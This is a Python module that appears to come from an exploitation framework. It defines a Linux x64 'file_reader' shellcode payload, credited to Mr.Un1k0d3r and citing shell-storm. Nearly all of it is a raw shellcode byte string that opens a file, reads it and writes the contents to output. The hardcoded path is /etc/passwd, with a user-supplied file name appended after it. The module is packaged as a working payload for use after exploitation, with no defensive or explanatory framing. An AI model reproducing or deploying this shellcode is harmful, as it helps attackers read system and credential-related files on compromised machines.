from lib.payloads.shellcode import Shellcode 


class Payload(Shellcode):
    Shellcode.info["author"] = "Mr.Un1k0d3r"
    Shellcode.info["name"] = "Linux/x64 - file_reader shellcode"
    Shellcode.info["references"] = [
        "http://shell-storm.org/shellcode/files/shellcode-878.php"
    ]

    def __init__(self, **kwargs): 
        Shellcode.info["size"] = 82 + Shellcode().getsize(kwargs["file"])
        Shellcode.info["payload"] = [
            r"\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31"
            r"\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89"
            r"\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48"
            r"\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01"
            r"\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff"
            r"\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41"
            + kwargs["file"]
        ]
